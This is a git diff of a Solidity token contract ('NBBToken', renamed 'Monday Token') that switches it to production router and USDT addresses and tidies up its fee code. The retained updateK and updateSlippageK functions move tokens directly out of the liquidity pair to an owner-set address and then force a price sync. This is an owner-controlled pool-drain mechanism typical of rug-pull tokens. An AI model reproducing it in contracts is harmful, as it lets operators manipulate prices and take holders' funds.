@@ -411,22 +411,9 @@ contract NBBToken is
     ERC20Upgradeable private _usdtToken;
 
     uint256 public buyFeeRate; //10%
-    // uint256 public lpFeeRate; //3%
-    // uint256 public communityFeeRate; //2%
-    // uint256 public referralFeeRate; //3%
-    // uint256 public platformFeeRate; //2%
     uint256 public mintFeeRate; //50%
-
-    // address public platformAddress; //TODO:
-    // address public referralAddress; //TODO:
-    // address public communityAddress; //TODO:
-    // address public lpAddress;
-
     uint256 public sellFeeRate; //10% 动态
-    // bool public addLpFlag;
-    // bool public syncFlag; //Remove
     uint256 public slippageFee;
-    // uint256 public minAmount; //Remove
     address public orePoolAddress; //TODO:
     address public pledgeAddress; //TODO:
     address public gameAddress; //TODO:
@@ -441,18 +428,18 @@ contract NBBToken is
     function _authorizeUpgrade(address) internal override onlyOwner {}
 
     function initialize() public initializer {
-        __ERC20_init("NBB.ETM", "NBB");
+        __ERC20_init("Monday Token", "Monday");
         __Ownable_init();
         __UUPSUpgradeable_init();
 
         _mint(msg.sender, 100000000000 * 10**decimals());
-        //PRD 0x1B6C9c20693afDE803B27F8782156c0f892ABC2d  TEST 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
+        //PRD 0x10ED43C718714eb63d5aA57B78B54704E256024E  TEST 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
         uniswapV2Router = IUniswapV2Router02(
-            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
+            0x10ED43C718714eb63d5aA57B78B54704E256024E
         );
         // PRD 0x55d398326f99059fF775485246999027B3197955 TEST
         _usdtToken = ERC20Upgradeable(
-            0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684
+            0x55d398326f99059fF775485246999027B3197955
         );
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                 address(this),
@@ -460,18 +447,7 @@ contract NBBToken is
             );
         buyFeeRate = 1000;
         sellFeeRate = 1000;
-
-        // communityFeeRate = 200;
-        // referralFeeRate = 300;
-        // platformFeeRate = 200;
-        // lpFeeRate = 300;
-
         mintFeeRate = 5000;
-
-        // platformAddress = owner();
-        // referralAddress = owner();
-        // communityAddress = owner();
-        // lpAddress = owner();
         orePoolAddress = owner();
         transferAddress = owner();
         pledgeAddress = owner();
@@ -528,23 +504,19 @@ contract NBBToken is
         uint256 _sellFeeRate
     ) public onlyOwner {
         buyFeeRate = _buyFeeRate; //10%
-        //  lpFeeRate = _lpFeeRate; //3%
-        //  communityFeeRate = _communityFeeRate; //2%
-        //  referralFeeRate = _referralFeeRate; //3%
-        //  platformFeeRate = _platformFeeRate; //2%
         mintFeeRate = _mintFeeRate; //50%
         sellFeeRate = _sellFeeRate; //10% 动态
     }
 
     function updateSlippageK(uint256 amount) public {
         require(slippageFee > amount);
-        super._transfer(uniswapV2Pair, owner(), amount);
+        super._transfer(uniswapV2Pair, orePoolAddress, amount);
         IPancakePair(uniswapV2Pair).sync();
         slippageFee = slippageFee.sub(amount);
     }
 
     function updateK(uint256 amount) public onlyOwner {
-        super._transfer(uniswapV2Pair, owner(), amount);
+        super._transfer(uniswapV2Pair, orePoolAddress, amount);
         IPancakePair(uniswapV2Pair).sync();
     }
 
@@ -557,18 +529,6 @@ contract NBBToken is
         emit Activate(spender, id);
     }
 
-    // function setFeeAddress(
-    //     address _platformFee,
-    //     address _referralAddress,
-    //     address _communityAddress,
-    //     address _lpAddress
-    // ) public onlyOwner {
-    //     platformAddress = _platformFee;
-    //     referralAddress = _referralAddress;
-    //     communityAddress = _communityAddress;
-    //     lpAddress = _lpAddress;
-    // }
-
     function setGameAddress(address account) public onlyOwner {
         gameAddress = account;
     }
@@ -576,14 +536,6 @@ contract NBBToken is
     function setOrePoolAddress(address account) public onlyOwner {
         orePoolAddress = account;
     }
-
-    // function setSoaSwapIndex(uint256 index) public onlyOwner {
-    //     soaSwapIndex = index;
-    // }
-
-    // function setSoaSwapAddress(address account) public onlyOwner {
-    //     soaSwapAddress = account;
-    // }
 
     function setSOAToken(address account) public onlyOwner {
         _soaToken = ERC20Upgradeable(account);
@@ -683,7 +635,7 @@ contract NBBToken is
 
     //理财质押
     function pledgeUSDT(uint256 amount) public {
-        // require(amount > 100 * 10**_usdtToken.decimals(), "less 100 U");
+        require(amount > 100 * 10**_usdtToken.decimals(), "less 100 U");
         address spender = _msgSender();
         _usdtToken.transferFrom(spender, pledgeAddress, amount);
         emit PledgeUSDT(spender, amount);
